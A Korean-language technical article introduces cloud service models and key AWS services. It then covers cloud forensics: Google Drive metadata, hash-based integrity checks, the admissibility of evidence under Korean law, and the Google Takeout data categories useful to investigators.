<p>클라우드를 접해본 사람이라면 알겠지만, 클라우드 컴퓨팅의 유형에는 PaaS (Platform as a service라는 분류가 존재한다. PaaS는 애플리케이션을 싸고 빠르게 개발할 수 있도록 표준화된 플랫폼을 제공해주는 서비스다. 서비스를 개발하는 데에 필요한 것을 제공하는 점에서 IaaS와 큰 차이가 없어 보인다. 플랫폼에 대한 개념이 모호하기 때문이다.</p>
<p>On-premise 방식으로 소프트웨어를 개발할 때 개발자는 단순히 소스코드를 작성하는 것 만으로 개발을 진행할 수 없다. 개발자는 소스코드를 작성함과 동시에 이를 빌드, 테스트, 배포, 관리하는 것에 대해 고민해야 된다. PaaS에서 제공하는 플랫폼은 개발자가 이런 부분을 고민하지 않고 애플리케이션의 개발에 집중하게끔 한다. AWS에서 제공하는 Elastic Beanstalk가 개발자가 코드를 업로드하면 용량 프로비저닝, 로드 밸런싱, 자동 조정부터 시작해 애플리케이션 상태 모니터링까지 배포를 자동으로 처리해주는 PasS의 예시이다.</p>
<p><img src="/images/monthly_24_04_image1.png" alt="그림 1. https://www.redhat.com/ko/topics/cloud-computing/iaas-vs-paas-vs-saas, [Cloud computing range]"></p>
<center><b>그림 1. [Cloud computing range]<br>https://www.redhat.com/ko/topics/cloud-computing/iaas-vs-paas-vs-saas</center></b><br>

<p>그림 1은 Red Hat에서 IaaS, PaaS, SaaS의 차이에 대해 설명한 문서에서 인용한 그림이다. 클라우드 컴퓨팅 서비스가 제공하는 요소의 범위를 나타내고 있다. 세 경우 모두 서비스 제공자가 관리하는 부분에 대해서는 사용자가 큰 신경을 쓸 필요가 없다는 특징을 가진다.<br><br></p>
<h2 id="2-4-클라우드-컴퓨팅-예시-–-AWS"><a href="#2-4-클라우드-컴퓨팅-예시-–-AWS" class="headerlink" title="2.4. 클라우드 컴퓨팅 예시 – AWS"></a>2.4. 클라우드 컴퓨팅 예시 – AWS</h2><p>클라우드 컴퓨팅의 대표적인 서비스를 고르라면 AWS를 쉽게 떠올릴 수 있다. 실제로 다양한 곳에서 AWS를 사용한다. 문제는 AWS 환경 구조가 꽤 생소하게 다가온다는 점이다. 직관적으로 알기 힘든 네이밍의 서비스들이 다수 사용되기 때문이다. 하지만 직접 공부한 결과, 클라우드 환경은 꽤 단순하다. AWS에서 제공하는 다양한 서비스를 선택해서 설정하고 사용하는 것이다. 사용자가 원하는 대로 클라우드 아키텍처를 구성할 수 있고, 물리적인 자원 없이 네트워크만으로 개발 환경 구축이 가능하다. 개발에서 그치지 않고 보안과 관리, 감사 등 서비스 제공 전체에 걸쳐진 서비스를 AWS로 사용할 수 있다.<br><br></p>
<h3 id="2-4-1-리전-Region-과-가용-영역-AZ-Availability-Zone"><a href="#2-4-1-리전-Region-과-가용-영역-AZ-Availability-Zone" class="headerlink" title="2.4.1. 리전(Region)과 가용 영역(AZ, Availability Zone)"></a>2.4.1. 리전(Region)과 가용 영역(AZ, Availability Zone)</h3><p>먼저 AWS를 사용하기 위해서는 특정 리전을 선택해야 한다. AWS를 개발한 아마존은 미국의 회사이지만 AWS의 클라우드 컴퓨팅 리소스들은 전세계에서 호스팅 된다. 이때 호스팅 되는 위치를 구분한 것을 리전(Region)이라고 하며, 각 리전은 여러 가용 영역(Availability Zone)으로 나뉜다. 각 리전마다 제공되는 서비스는 다를 수 있다. 사용자는 지연 속도, 리전이 속하는 지역의 법률, 사용 가능한 AWS에 따라 원하는 리전을 선택할 것이다. 각 리전은 완전히 독립적이기 때문에 서울 리전에서 만든 리소스를 미국 버지니아 북부 리전에서 사용하는 등의 구성을 할 수는 없다.</p>
<p>AWS 리전은 최소 두개 이상의 가용 영역으로 이루어져 있다. 각각의 가용 영역에는 최소 1개 이상의 데이터 센터가 있으며 이 데이터 센터에 50,000에서 80,000대 사이의 물리적 서버가 존재한다. 즉, 사용자가 저장하는 데이터는 이곳에 물리적으로 저장된다. 데이터 센터를 사용자들이 나누어 사용하는 것이다.</p>
<p>물리적 위치를 공유하는 특성 때문에 데이터 보안이 클라우드 서비스에서 중요한 것은 자명하다. 앞서 클라우드 컴퓨팅의 특징을 이야기하며 사용자는 자신의 데이터가 저장된 정확한 위치를 알 수 없어야 한다고 했다. AWS에서도 이 특징이 나타난다. 예를 들어, A계정과 B계정이 서울 리전의 1번 가용영역에 데이터를 저장할 때, 이 둘은 동일한 가용영역을 사용하는 것처럼 보이지만 실제로는 랜덤 한 물리적 위치에 데이터가 존재하게 된다. 따라서 계정 정보를 알지 못한다면 특정 사용자의 데이터에 접근하는 것은 불가능하다. 이는 AWS의 글로벌 서비스인 IAM으로 보장된다.<br><br></p>
<h3 id="엣지-로케이션-Edge-Location"><a href="#엣지-로케이션-Edge-Location" class="headerlink" title="엣지 로케이션(Edge Location)"></a>엣지 로케이션(Edge Location)</h3><p>엣지 로케이션은 AWS의 CDN(Contents Delivery Network)의 여러 서비스들을 빠른 속도로 제공하기 위한 거점이다. 사용자의 요청을 빠르게 제공하기 위해 사용하는 캐싱 기술이라고 생각하면 쉽다. 앞서 컴퓨팅 리소스를 원활하게 제공하기 위해 AWS 리전을 나누어 제공한다고 설명했는데 엣지 로케이션은 리전 및 가용영역과 완전 별개로 작동한다.</p>
<p>예를 들어 호주에서 한국의 AWS 서비스에 접근한다고 생각해보자. 엣지 로케이션을 사용하지 않는 경우 호주에서 한국 리전에 존재하는 웹 서버에 요청을 보내고, 웹 서버에서 보내는 답장을 받을 것이다. 거리가 긴 만큼 큰 딜레이가 생기고 영상 등의 콘텐츠를 사용할 때에는 문제가 발생할 수 있다.</p>
<p>엣지 로케이션을 사용하면 컨텐츠를 다운로드하는 최초에만 해당 컨텐츠가 존재하는 한국 리전에 직접 요청을 보낸다. 이후에는 받은 데이터을 호주 근처에 위치한 엣지 로케이션에 저장한 후, 해당 엣지 로케이션을 이용해 통신할 수 있다. 거리가 먼 리전에 요청을 보내는 것보다 훨씬 효율적으로 작동하여 네트워크 성능을 높인다. 이러한 기능을 위해 AWS에서는 CloudFront 서비스를 제공한다.<br><br></p>
<h3 id="2-4-2-AWS-대표-서비스"><a href="#2-4-2-AWS-대표-서비스" class="headerlink" title="2.4.2. AWS 대표 서비스"></a>2.4.2. AWS 대표 서비스</h3><h3 id="컴퓨팅-서비스"><a href="#컴퓨팅-서비스" class="headerlink" title="컴퓨팅 서비스"></a>컴퓨팅 서비스</h3><ul>
<li><p><strong>EC2</strong> (Elastic Compute Cloud): AWS의 가장 대표적이고 널리 쓰이는 인프라로, 컴퓨팅 리소스를 제공하는, IaaS다. 네트워크를 통해 물리적 컴퓨터 하나를 사용할 수 있다고 생각하면 쉽다.</p>
</li>
<li><p>EC2에서 제공하는 인프라는 가상머신(이미지)으로 제공되며 ‘인스턴스’라고 불린다. 앞으로 등장하는 EC2 인스턴스를 서버로 치환하여 생각하면 쉽다. EC2에서 제공하는 인스턴스의 종류는 다양하며 용도에 맞게 선택하여 사용할 수 있다.</p>
</li>
<li><p>ECS (EC2 Container Service): EC2 서버를 Docker 컨테이너로 관리 가능한 서비스이다.</p>
<br></li>
</ul>
<h3 id="네트워킹-서비스"><a href="#네트워킹-서비스" class="headerlink" title="네트워킹 서비스"></a>네트워킹 서비스</h3><ul>
<li><strong>VPC</strong> (Virtual Pricate Network): 가상 네트워크 구축 서비스로, IP 주소 범위를 선택하고 서브넷 생성, 라우팅 테이블, 네트워크 게이트웨이 구성 등 가상 네트워킹 환경을 제어하기 위한 서비스이다.</li>
<li><strong>Rounte53</strong>: AWS에서 DNS(Domain Name System) 역할을 하는 서비스이다.</li>
<li><strong>Cloud Front</strong>: 데이터, 동영상, 애플리케이션 및 API를 전 세계 사용자들에게 전송하는 AWS의 고속 글로벌 콘텐츠 전송 네트워크(CDN) 서비스다. 앞서 설명한 것처럼 엣지 로케이션 기준 가장 가까운 곳에서 파일 캐시를 가져와 속도가 빠르다.</li>
<li><strong>ELB</strong>: 접속량이 많을 경우 Load Balancing을 통해 들어오는 트래픽을 분산해주는 역할을 하는 서비스이다.</li>
</ul>
<br>

<h3 id="스토리지-서비스"><a href="#스토리지-서비스" class="headerlink" title="스토리지 서비스"></a>스토리지 서비스</h3><ul>
<li><strong>S3</strong> (Simple Storage Service): 정적 파일 스토리지 서비스로 사진, 비디오, 문서, Frontend 코드, Lambda 함수 코드 등의 데이터가 저장된다. 사용자는 URL을 통해 S3에 저장된 파일을 사용하며 각 유저의 액세스를 컨트롤하는 기능이 존재한다.</li>
<li><strong>EBS</strong> (Elastic Block Store): EC2 인스턴스에 장착하여 사용할 수 있는 가상 저장 장치. 일반 PC의 SSD와 비슷하게 생각할 수 있다. EC2 인스턴스를 종료하지 않고 저장 공간을 늘릴 수 있으며, EC2 인스턴스와 관계없이 EBS의 파일은 영구적인 보관이 가능하다.</li>
</ul>
<p>S3와 EBS는 저장공간을 제공한다는 점에서는 비슷하지만 저장하는 방식에서 큰 차이를 보인다. EBS의 경우 Block Storage 방식을 사용하며 하나의 가용영역 내에서 여러 서버에 복제되어 데이터가 저장된다. 네트워크 연결 없이 일반적인 컴퓨터 저장공간을 쓰는 것처럼 접근할 수 있다. 반면 S3의 경우 네트워크를 통해 ‘버킷’이라는 단위에 데이터를 저장하고 객체 URL로 데이터에 접근한다. 즉, 온라인 스토리지 서비스라 볼 수 있다.<br><br></p>
<h3 id="데이터베이스-서비스"><a href="#데이터베이스-서비스" class="headerlink" title="데이터베이스 서비스"></a>데이터베이스 서비스</h3><ul>
<li><strong>RDS</strong> (Relational Database Service): 관계형 데이터베이스 서비스.</li>
</ul>
<br>

<h3 id="보안-서비스"><a href="#보안-서비스" class="headerlink" title="보안 서비스"></a>보안 서비스</h3><ul>
<li><strong>IAM</strong> (Identity and Access Management): AWS 사용자, 그룹 및 역할의 AWS 서비스 및 리소스 액세스를 안전하게 제어할 수 있도록 하는 서비스이다. AWS 사용자에 따라 IAM 설정을 통해 권한을 관리하고 지정할 수 있다.</li>
<li><strong>Network Firewall</strong>: VPC에 필수 네트워크 보호 기능을 배포할 수 있도록 하는 관리형 서비스.</li>
<li><strong>KMS</strong>: 데이터의 암호화를 위해 사용하는 관리형 서비스로, 고가용성의 키 저장소와 관리 감사 기능을 제공한다. 어플리케이션에서 사용하는 데이터는 이 서비스를 이용해 암호화된다.</li>
</ul>
<br>

<h3 id="관리-서비스"><a href="#관리-서비스" class="headerlink" title="관리 서비스"></a>관리 서비스</h3><ul>
<li><strong>CloudWatch</strong>: 개발자, 운영자, IT 관리자 등을 위해 구축된 모니터링 및 관리 서비스. AWS 리소스와 실행 중인 어플리케이션을 실시간으로 모니터링 하는 서비스이다. 여러 지표를 감시하며 특정 기준에 따라 리소스를 자동으로 조정하는데 인스턴스 중지, Auto Scaling 그룹 조정, Amazon SNS 알림 시작 등으로 구성할 수 있다.</li>
<li><strong>CloudTrail</strong>: AWS 계정을 만들 때부터 자동으로 모든 작업이 기록되는 서비스. 관리 콘솔, 프로그램에서의 작업, 서비스에서 수행한 모든 작업을 기록하다. 기본적으로 로그는 90일동안 저장되며, S3 서비스 등과 같이 사용해 별도의 스토리지에 로그를 저장할 수 있다. 로그의 변조를 막는 기능도 존재하기에 조작 기록을 증명하기 위한 중요한 기록으로 쓰인다.</li>
</ul>
<p>그럼 웹페이지 하나를 서비스하기 위해선 어떤 것들이 필요할까? 전통적인 방식으로 웹페이지 서비스 환경을 만드는 경우를 가정해보자. 우선 웹 서버가 필요할 것이고, 사용자들의 데이터를 보관할 데이터베이스가 필요하다. 웹페이지 개발을 한번 코드를 쓴다고 끝나지 않으므로 지속적으로 이를 업데이트하는 것을 용이하게 해줄 프로그램도 필요하다. 보안을 위해 외부와 내부의 통신망 분리도 빼놓을 수 없다. 하물며 내부에서도 내부망을 분리해 사용하기도 한다. 이를 위해선 라우터, 스위치와 같은 추가적인 장치가 필요하다.</p>
<p><img src="/images/monthly_24_04_image2.png" alt="그림 2. 웹서버 아키텍처"></p>
<center><b>그림 2. 웹서버 아키텍처</center></b><br>

<ul>
<li>라우터: 데이터 패킷을 의도한 IP 주소로 전달하는 네트워크 장치. 주로 광역네트워크(WAN)과 근거리 통신망(LAN) 간의 통신을 담당한다.</li>
<li>스위치: 네트워크, 주로 근거리 통신망(LAN) 내부의 장치를 연결한다. 스위치에 연결된 장치끼리 데이터를 주고받을 수 있다.</li>
<li>DMZ(Demilitarized Zone): 내부와 외부를 분리하는 중간 지대. 주로 인터넷이 연결된 웹 서버, 메일 서버, DNS 서버 등이 배치된다. 내부 네트워크와 완전히 분리된 채 외부와 통신이 가능해 내부망으로 들어가는 악성 트래픽을 막을 수 있다.</li>
<li>DNS 서버: 도메인 주소를 ip주소로 변환하는 서버.</li>
</ul>
<p>위와 같은 단순한 웹서버 구조를 AWS를 이용해 다음과 같이 변환할 수 있다.</p>
<p><img src="/images/monthly_24_04_image3.png" alt="그림 3. 클라우드 환경"></p>
<center><b>그림 3. 클라우드 환경</center></b><br>
<br><br>

<h1 id="3-클라우드-포렌식-Cloud-Forensic"><a href="#3-클라우드-포렌식-Cloud-Forensic" class="headerlink" title="3. 클라우드 포렌식 (Cloud Forensic)"></a>3. 클라우드 포렌식 (Cloud Forensic)</h1><p>클라우드 기술의 발달로 혁신과도 같은 변화가 일어났음은 분명하다. 클라우드 컴퓨팅 기술은 단순히 인프라 구성을 용이하게 만드는 데서 그치지 않고 다양한 영역에 영향을 미쳤다. 예를 들어, 요즈음 대중들이 사용하는 스마트폰에는 클라우드 스토리지 서비스에 자동적으로 사진과 같은 데이터를 백업하는 기능이 흔하다. 스마트폰, 노트북, 태블릿 PC 등의 디지털기기가 서로 연결되어 데이터를 공유하고 동기화되어 어디서나 컴퓨팅을 할 수 있게 되기도 했다. 조금 다른 분야에도 클라우드는 영향을 미쳤다. 바로 디지털 포렌식 조사이다.</p>
<p>조사 시 물리적인 시스템에 데이터가 저장되어 있는 경우 하드디스크나 컴퓨터 시스템 본체를 압수하고 이를 이미징하여 데이터를 분석할 수 있다. 반면 클라우드 환경이 가지는 빅 데이터, 가상화 기술, 보안 기술 등은 디지털 증거 압수수색을 어렵게 만든다. 빅 데이터는 기존 데이터에 비해 엄청난 양, 매우 빠른 데이터의 생성과 흐름 속도, 다양한 형태, 복잡성을 가진다. 따라서 압수수색 시 빅 데이터의 모든 내용을 분석하는 것은 불가능하다. 애초에 형사소송법 106조 3항에 따라 데이터를 출력, 복제하여 제출하는 것부터 불가능하다.</p>
<p>가상화 기술은 더욱 난감하다. 클라우드에서는 하나의 물리적 자원을 사용자들이 나누어 사용할 수 있게끔 하는 가상화 기술을 적극적으로 사용한다. 하지만 이러한 물리적 위치의 불분명함은 압수수색을 어렵게 만든다. 서비스 제공자의 협력 없이는 클라우드에 저장된 데이터의 압수수색이 불가능한 경우가 발생하기도 한다.<br><br></p>
<h2 id="3-1-클라우드-스토리지-서비스에서의-포렌식"><a href="#3-1-클라우드-스토리지-서비스에서의-포렌식" class="headerlink" title="3.1. 클라우드 스토리지 서비스에서의 포렌식"></a>3.1. 클라우드 스토리지 서비스에서의 포렌식</h2><p>클라우드 스토리지 서비스는 서비스 방식에 따라 퍼블릭 클라우드 스토리지와 프라이빗 클라우드 스토리지로 나뉜다. 퍼블릭 스토리지 클라우드는 서비스 인프라가 사용자와 분리되어 있고 서비스 공급자에 의해 관리된다. 사용자는 공용 인터넷을 통해 인프라에 접속해 사용한다.</p>
<p>이러한 퍼블릭 스토리지 서비스의 경우 실제 데이터가 저장되는 데이터 서버가 전 세계에 분산되어 있다. 때문에 사용자가 데이터가 저장된 물리적 위치를 알기란 쉽지 않으며 수사관이 클라우드 스토리지에서 데이터를 수사하기 위해서는 해당 클라우드 서비스를 직접 이용하거나 서비스 공급자의 협조가 필요하다. Google, Microsoft 등 기업에서 제공하는 Google drive, One drive 등이 퍼블릭 스토리지 서비스에 속한다.</p>
<p>프라이빗 클라우드 스토리지는 스토리지 서비스 인프라를 단일 사용자 또는 조직이 소유한 채 사용되는 스토리지를 말한다. 주로 기업이나 기관 내부에서 확장성과 유연성이 필요로 하는 환경에서 많이 사용한다. 이 경우 인프라를 소유하는 사용자가 존재하고, 이에 의해 시스템이 유지-관리되기 때문에 데이터 제어를 자유롭게 할 수 있으며 보안 수준도 높다.</p>
<p>퍼블릭 스토리지 서비스와 다르게 프라이빗 스토리지 서비스의 경우 데이터 서버 접근이 용이하며 대상 데이터에 대해 물리적인 이미징이 가능하다. 때문에 퍼블릭 클라우드 스토리지 보다는 기존 포렌식 기법을 적용하는 게 수월하다는 특징을 가진다. 현재 상용화된 프라이빗 클라우드 스토리지 서비스에는 Synology, Seafile Seagate 등이 있다.</p>
<p>이제 서문에서 던졌던 의문을 풀어보자. 구글 클라우드에 저장된 증거는 어떻게 수집할까? 단순히 클라우드에 저장된 파일은 다운받는 행위만으로 증거 수집이 인정될까? 클라우드 스토리지에서 데이터를 수집할 때 얻을 수 있는 아티팩트에는 어떤 것이 있을까?<br><br></p>
<h3 id="3-2-구글-드라이브에서-얻을-수-있는-데이터"><a href="#3-2-구글-드라이브에서-얻을-수-있는-데이터" class="headerlink" title="3.2. 구글 드라이브에서 얻을 수 있는 데이터"></a>3.2. 구글 드라이브에서 얻을 수 있는 데이터</h3><p>디지털 포렌식 수사는 단순히 파일을 다운로드 받는 것에서 그치지 않는다. 어떤 파일이 저장될 때, 파일은 <strong>메타데이터</strong>와 함께 저장된다. 메타데이터에는 생성일시, 수정일시, 접근일시 등의 시간정보가 있다. 시간정보는 파일을 생성, 복사, 이동, 수정함에 따라 변한다. 특정 파일시스템이 시간정보를 변경하는 규칙을 파악하면 파일의 메타데이터와 결합하여 조사 대상자의 행적을 조사할 수 있다.</p>
<p>윈도우 OS인 파일시스템인 NTFS(New Technology File System)은 다음과 같은 볼륨 구조를 가진다.</p>
<ul>
<li>NTFS 부트 섹터: BIOS 매개변수 블록</li>
<li>MFT(Master File Table): NTFS 볼륨에서 파일을 검색하는데 필요한 정보인 파일의 속성 따 따위 저장된다.</li>
<li>파일시스템 데이터: MFT 내부에 저장되지 않은 Non-resident 데이터를 저장한다.</li>
<li>MTF 사본: 파일시스템 복구를 위해 필요한 필수 레코드가 포함된 사본이다.</li>
</ul>
<p>MTF는 다수의 MTF 레코드로 이루어지며 이 안에 경로, 크기, 권한, 생성·수정·접근·변경에 관한 시간 정보 등의 속성이 포함된다. MTF 레코드의 보편적인 속성에는 $STANDARD_INFORMATION과 $FILE_NAME가 있는데 이 안에는 생성일시, 수정일시, MFT 수정일시, 접근일시 등의 메타데이터가 들어있다.</p>
<p>이러한 메타데이터 중 생성·수정·접근일시는 윈도우에서 파일을 선택한 후 ‘속성’을 확인하여 알 수 있다.</p>
<p>파일시스템에서 추가하는 메타데이터 외 파일 내부에 존재하는 메타데이터도 획득이 가능하다. 예를 들어 Exif 이미지 파일 형식은 촬영한 사진 파일의 메타데이터를 태그에 저장하여 관리한다. Exif 표준에 따르면 메타데이터 태그에는 다음과 같은 정보가 포함된다.</p>
<ul>
<li>촬영 날짜 및 시간</li>
<li>카메라 모델 및 제조사 정보</li>
<li>방향(회전), 조리개, 셔터 속도, 초점 거리, 측광 모드 및 ISO 감도 정보 등 이 미지 정보</li>
<li>카메라의 LCD 화면에서 사진 미리보기를 위한 섬네일(thumbnail) 파일</li>
<li>촬영된 사진의 설명</li>
</ul>
<p>이런 파일 자체나 파일시스템이 부여하는 메타데이터는 일반적인 디지털 포렌식에서 얻을 수 있는 것 외에 클라우드 스토리지에 파일을 업로드하고 다운로드하는 과정에서 생성되거나 변경되는 메타데이터가 있다. 예를 들어 구글 드라이브는 파일 세부정보다 클라우드에 파일을 업로드한 시간과 수정한 시간 등의 정보를 별도로 저장한다. 활동 란에는 누가 어떤 파일을 업로드하고 다운로드 했는가 와 같은 로그를 확인할 수 있다. 다만 해당 데이터는 파일로 다운로드 할 수 없고 캡쳐를 통해서만 획득이 가능하다.</p>
<p><img src="/images/monthly_24_04_image4.png" alt="그림 4. 구글 드라이브의 메타데이터"></p>
<p><b><center>그림 4. 구글 드라이브의 메타데이터</center></b><br></p>
<p><img src="/images/monthly_24_04_image5.png" alt="Untitled"><br><br></p>
<h3 id="3-3-구글-드라이브-데이터의-증거능력"><a href="#3-3-구글-드라이브-데이터의-증거능력" class="headerlink" title="3.3. 구글 드라이브 데이터의 증거능력"></a>3.3. 구글 드라이브 데이터의 증거능력</h3><p>디지털 증거가 법정에서 증거능력을 가지기 위해서는 무결성이 증명되어야 하는데, 이러한 증명은 보통 해시 값을 활용한다. 해시 함수에 파일의 데이터를 넣어 나오는 값이 유일함을 이용한 방법이다. 간단한 사진 파일을 드라이브에 업로드하고 다운받아 해시 값을 확인해보았다.</p>
<p><img src="/images/monthly_24_04_image6.png" alt="그림 5. 사진의 속성 값 확인"></p>
<p><b><center>그림 5. 사진의 속성 값 확인</center></b><br></p>
<p>왼쪽이 원본 사진, 오른쪽이 클라우드에 업로드 후 다운받은 사진이다. 다운받은 파일의 경우 만든 날짜, 수정한 날짜, 액세스한 날짜가 전부 클라우드에서 다운로드한 시점으로 설정된 것을 알 수 있다.</p>
<p><img src="/images/monthly_24_04_image7.png" alt="그림 6. 사진의 해시 값 확인"></p>
<p><b><center>그림 6. 사진의 해시 값 확인</center></b><br></p>
<p>Hashtab을 이용해 확인하면 두 파일의 해시 값이 동일하다. 따라서 구글 드라이브에서 파일을 다운로드하는 행위는 파일의 무결성이 보장된다.</p>
<p>다만 이는 웹 브라우저로 구글 드라이브에 접속해 원본 파일을 다운로드 받은 경우에만 국한된다. 구글은 클라우드 스토리지 용량 관리를 위해 사진이나 동영상 파일을 저화질로 업로드할 수 있는 기능을 제공한다. 이 경우 화질이 달라진 파일은 원본 파일과 다른 파일이 된다. 그렇다면 이 경우에도 증거로 채택이 가능할까?</p>
<p>클라우드 스토리지의 수사 활용가능 데이터 획득 방안 연구[1]에서 원본 파일이 없는 상태에서 클라우드 스토리지 내 저장된 비교적 저화질의 사진 및 동영상 파일을 증거로 사용할 수 있을지에 대한 검토를 진행하였으며 해당 내용을 참고해 판단해보았다.</p>
<p>디지털 증거는 1)원본이거나 2)원본으로부터 복사한 사본일 때 복사 과정에서 편집되는 등 인위적 개작 없이 원본의 내용 그대로 복사한 사본임이 증명되었을 때 증거능력을 갖으며, 이 증명이 불가하면 증거능력이 인정되지 않는다. 다만 3)피고인이 동의하거나 4)신용할 만한 정황에 의해 작성된 문서의 경우 증거능력을 가진다.</p>
<p>원본을 제출하지 못하고 클라우드에서 내려 받은 수정된 데이터만 존재한다 가정하자. 증거는 진술증거와 비진술증거로 나뉜다. 진술증거는 매체와 관계없이 사람이 의미의 인식을 통해 사상이나 관념을 표현하는 내용이 포함된 증거를 의미한다. 즉, 개인의 의견이 들어갈 가능성이 있으면 진술증거다. 비진술증거는 그 반대로 CCTV 화면, 블랙박스 화면 등 의견 개입이 불가능한 증거를 의미한다. 이 경우는 사람의 의견이 담기지 않으므로 전문법칙(전문증거는 증거가 아니어서 증거능력이 인정되지 않는다.)이 적용되지 않아 증거로 인정된다. 만약 동영상 파일 속의 대화, 발표, 독백 등의 내용을 증거로 하는 경우에는 진술증거로 취급되며 전문증거의 여부를 따져야 한다.</p>
<p>전문증거는 “사실인정의 기초가 되는 사실(요증사실)을 경험자 자신이 직접 법원에 진술하지 않고, 타인의 진술이나 서류의 형태에 의해 간접적으로 보고하는 것”이다. 전문증거인 진술증거에는 전문법칙이 적용된다. 다시 이야기하면 특정 사실을 직접 경험한 사람의 진술은 법정에 직접 제출되어야 하고 이를 기록한 서류 따위가 제출되어서는 안 된다는 뜻이다.</p>
<p>만약 디지털 증거가 진술증거이면서 그 내용의 진실성이 범죄사실에 대한 직접증거로 사용될 때는 전문증거가 되어 전문법칙을 적용 받아 증거능력을 잃을 것이다. 다만 디지털 증거 자체가 요증사실의 구성요소를 이루는 경우에는 전문법칙을 적용 받지 않는다.</p>
<p>예를 들어 “대법원 2008. 11. 13. 선고 2006도2556 판결.” 에서는 ‘문자정보를 휴대전화 화면에 띄워 촬영한 사진’을 전문증거로 판단하지 않았다. 문자정보 자체가 피고인의 범죄행위를 증명하는 증거였기 때문이다.</p>
<p>또한 진술 내용의 진실성과 관계없는 간접사실에 대한 정황증거로 증거가 제출된다면 전문법칙이 적용되지 않아 증거능력을 가질 수 있다.</p>
<p>추가적으로 진술증거 및 전문증거 여부와 관계없이, ‘최량증거의 법칙’에 따르면 소송당사자는 사실을 입증하기 위한 여러 개의 증거방법을 가지고 있는 경우 가장 증거력이 강하고 우수한 증거를 제출하여 입증하여야 한다. 원본 파일 없이 클라우드 스토리지에 저화질 파일만 존재하는 경우, 1)클라우드 스토리지에 업로드 되었다는 점에서 원본의 존재가 증명되고 2)원본 파일이 삭제되었으므로 저화질 파일을 제출해야 하는 필요성이 증명되고 3)파일 이름, 클라우드 스토리지에 업로드한 일시, 클라우드 스토리지 상에서의 수정 일시, 파일 내부에 존재하는 촬영일시 등의 시간 정보를 비교하고, 파일 대상 행위 기록을 통해 원본 파일에서 단순한 화질과 메타데이터 변화면 있었다는 점(정확성)을 만족할 경우 저화질의 파일로도 증거능력을 확보할 수 있을 것이다.<br><br></p>
<h3 id="3-4-구글-클라우드-서비스-데이터-수집의-활용"><a href="#3-4-구글-클라우드-서비스-데이터-수집의-활용" class="headerlink" title="3.4. 구글 클라우드 서비스 데이터 수집의 활용"></a>3.4. 구글 클라우드 서비스 데이터 수집의 활용</h3><p>구글에서는 구글 드라이브 파일을 한 번에 다운받을 수 있는 구글 Takeout 서비스를 제공한다. 이는 드라이브나 구글 포토와 같은 클라우드 스토리지 서비스 뿐 아니라 구글 계정을 중심으로 동기화되는 각종 데이터와 로그의 수집에 활용될 수 있다.</p>
<p>구글 Takeout은 구글의 서비스 이용 시 구글 계정에 저장되는 사용자 활동 관련 기록, 클라우드 스토리지 내부 파일 등 약 28여개의 구글 서비스 데이터를 다운로드 할 수 있는 기능을 제공한다. 이때 다운로드 되는 데이터에는 업로드 된 파일 뿐 만 아니라 구글 계정을 공유하는 모든 기기에서의 사용 내역, 동기화된 파일, 시간 정보를 포함한 모든 안드로이드 앱의 구동 내역, 사용자 위치 정보 등이 포함된다.</p>
<p>이중 디지털 포렌식에 유용하게 활용될만한 서비스는 다음과 같다.</p>
<ul>
<li><strong>Android Device Configuration Service</strong>: 구글 계정으로 로그인한 안드로이드 기기들의 정보를 저장한다. 해당 로그는 html 파일로 저장되며 문서를 확인하면 언어, 시간대, 시리얼 번호, 모델 등 하드웨어 정보, 소프트웨어 정보, 시간 및 네트워크 정보를 알 수 있다.</li>
</ul>
<p><img src="/images/monthly_24_04_image8.png" alt="그림 7. 구글 Takeout에서 Android Device Configuration 서비스의 모습"></p>
<center><b>그림 7. 구글 Takeout에서 Android Device Configuration 서비스의 모습</center></b><br><br>

<p><img src="/images/monthly_24_04_image9.png" alt="그림 8. 다운 된 로그 파일"></p>
<center><b>그림 8. 다운 된 로그 파일</center></b><br><br>

<p><img src="/images/monthly_24_04_image10.png" alt="그림 9. 로그 파일 내용 형식"></p>
<center><b>그림 9. 로그 파일 내용 형식</center></b><br>

<ul>
<li><strong>Android</strong>: 구글 계정으로 로그인한 안드로이드 기기에서 구동된 모든 앱의 구동 내역이 저장되는 서비스. 해당 로그를 분석하면 사용자가 언제, 어느 기기에서 어떤 앱을 구동했는지 알 수 있다. 다만 해당 앱을 통해 구체적으로 어떤 활동을 했는지는 알 수 없다.</li>
<li><strong>Assistant</strong>: 구글 어시스턴스를 사용한 내역이 저장된다. 사용자의 질문, 어시스턴스의 답변, 시간 정보, 사용자 위치 정보를 분석할 수 있다. 만약 음성 정보를 구글에 전송하는데에 동의했다면 목소리가 MP3 파일로 저장될 것이다.</li>
<li><strong>Chrome</strong>: 구글 크롬 앱을 사용한 내역이 저장된다.</li>
<li><strong>Contacts</strong>: 사용자가 구글로 동기화한 주소록 내역을 분석할 수 있다.</li>
<li><strong>Drive</strong>: 구글 드라이브에 업로드한 모든 파일과 메타데이터를 저장한다.</li>
<li><strong>Gmail</strong>: 사용자가 지메일 메일함에서 검색한 내역을 저장하며 검색을 수행한 시각, 검색 키워드를 알 수 있다.</li>
<li><strong>Google Photos</strong>: 구글 포토로 업로드하거나 자동 동기화된 멀티미디어 파일에 대한 메타 데이터와 실제 파일을 저장한다.</li>
</ul>
<p><img src="/images/monthly_24_04_image11.png" alt="그림 10. Google Photos 서비스에서 다운 받은 로그 모습"></p>
<center><b>그림 10. Google Photos 서비스에서 다운 받은 로그 모습</center></b><br>

<p>이때, .json 확장자를 가진 파일들이 존재하며 해당 파일에 구글 포토 자체의 메타데이터와 저장된 사진의 메타데이터를 확인할 수 있다.</p>
<ul>
<li><strong>Location History</strong>: 사용자가 구글에 자신의 위치 정보 전송을 동의했을 때, 구글 계정이 로그인 된 스마트 기기의 위치 정보를 수집하는 서비스이다. 해당 서비스의 로그는 이동 경로와 방문 장소로 나뉘어져 있으며 이를 분석할 경우 사용자가 이동한 경로의 출발지와 도착지에서의 시간정보. 위도, 경도 정보 등을 알 수 있다.</li>
<li><strong>Video Search</strong>: 유튜브나 구글 크롬 앱 등을 이용해 시청하거나 검색한 비디오 콘텐츠를 저장하는 서비스이다. 해당 로그를 분석하면 시청 및 검색에 사용한 서비스 종류, 콘텐츠, URL, 검색 키워드 등을 알 수 있다.</li>
<li><strong>YouTube</strong>: 유튜브 시청 및 검색기록을 저장하며 해당 로그를 제공한다.</li>
</ul>
